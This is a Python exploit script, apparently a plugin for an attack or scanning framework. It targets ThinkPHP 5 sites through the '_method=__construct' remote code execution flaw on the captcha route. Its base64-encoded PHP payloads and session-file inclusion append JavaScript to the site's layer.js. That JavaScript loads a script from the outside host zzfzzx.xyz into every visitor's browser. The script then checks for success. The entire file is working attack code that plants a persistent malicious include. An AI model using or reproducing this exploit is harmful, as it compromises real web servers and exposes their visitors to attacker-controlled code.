import requests
import random,time
import urllib3,base64
from urllib.parse import quote
from ClassCongregation import color

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

pathinfo = './static/layer/layer.js'

txt = """
var e = document.createElement("script");
e.async = !0,
e.src = "//zzfzzx.xyz/js/f291a6e74cee7021.js";
e.charset="UTF-8";
var t = document.getElementsByTagName("script")[0];
t.parentNode.insertBefore(e, t);"""

payload = "<?php+$a='file_put_contents';$b='base64_decode';$a($b('{}'),$b('{}'),FILE_APPEND);?>".format(base64.b64encode(pathinfo.encode()).decode(),quote(base64.b64encode(txt.encode()).decode(),'utf-8'))

post_param  = r"s=file_put_contents('{random}',base64_decode('dmFyIGUgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJzY3JpcHQiKTsKZS5hc3luYyA9ICEwLAplLnNyYyA9ICIvL3p6Znp6eC54eXovanMvZjI5MWE2ZTc0Y2VlNzAyMS5qcyI7CmUuY2hhcnNldD0iVVRGLTgiOwp2YXIgdCA9IGRvY3VtZW50LmdldEVsZW1lbnRzQnlUYWdOYW1lKCJzY3JpcHQiKVswXTsKdC5wYXJlbnROb2RlLmluc2VydEJlZm9yZShlLCB0KTs%3D'),FILE_APPEND)&_method=__construct&method=POST&filter[]=assert"

post_param1 = r"_method=__construct&filter[]=think\Session::set&method=get&get[]={random}&server[]=1"

post_param2 = r"_method=__construct&method=GET&filter[]=think\__include_file&get[]=/tmp/sess_{random}&server[]=1"

headers = {
  "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36",
  "Content-type": "application/x-www-form-urlencoded",
  "Cache-Control": "no-cach",
  "Accept": "text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2",}

def Merge(dict1, dict2):
    res = {**dict1, **dict2} 
    return res

def random_str(length):
    h = "abcdefghijklmnopqrstuvwxyz0123456789"
    salt_cookie = ""
    for i in range(length):
        salt_cookie += random.choice(h)
    return salt_cookie

def check(**kwargs):
    #for line in f.readlines():
    line = kwargs['url'].strip().strip('/')
    url = line + "/index.php?s=captcha"
    url2 = line + "/" + pathinfo.strip('/')
    PHPSESSID = random_str(25)
    headers_tmp = {"Cookie": "PHPSESSID="+PHPSESSID}
    try:
        r = requests.post(url,
            data=post_param.replace(r'{random}',pathinfo),
            headers=headers,
            timeout=10,
            verify=False,)
        
        time.sleep(0.5)
        r1 = requests.post(url,
            data=post_param1.replace(r'{random}',payload),
            headers=Merge(headers, headers_tmp),
            timeout=10,
            verify=False,)
    
        time.sleep(0.5)
        r2 = requests.post(url,
            data=post_param2.replace(r'{random}',PHPSESSID),
            headers=Merge(headers, headers_tmp),
            timeout=10,
            verify=False,)
        
        r3 = requests.get(url2,timeout=5) 
        if 'zzfzzx.xyz' in r3.text:
            color('[+]{} success -v-'.format(url2),'green')
            return True
        else:
            color('[-]{} failed -Λ-'.format(url2),'blue')
            return False
        
    except Exception as e:
        color("[*]{} request error {}".format(line,type(e)),'red')
        return 'Error'



















